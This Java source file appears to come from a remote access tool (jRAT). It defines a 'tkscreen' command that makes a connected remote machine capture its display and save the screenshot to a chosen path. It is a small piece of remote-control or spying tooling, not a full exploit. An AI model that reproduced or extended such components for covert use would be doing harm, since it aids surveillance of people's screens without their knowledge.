package net.jrat.core.command.commands.connection;

import java.io.File;

import org.apache.commons.cli.CommandLine;

import net.jrat.core.command.Command;
import net.jrat.core.packet.server.S8PacketScreenshot;
import net.jrat.utils.Variables;

public class TakeScreenshot extends Command
{
	public TakeScreenshot()
	{
		super("tkscreen", new String[] { "opath" }, new String[] { "sets the output path" }, "takes a screenshot of the display (jpg)");
	}
	
	@Override
	public void execute(CommandLine commandLine) throws Exception
	{
		if(this.server.currentConnection == null)
			throw new Exception("current connection is equal to null");
		
		final String opath = commandLine.getOptionValue("opath", Variables.instance.workDir + "screenshots" + File.separator + "screenshot.jpg");
		this.server.currentConnection.outputStream.writeObject(new S8PacketScreenshot(opath));
	}
}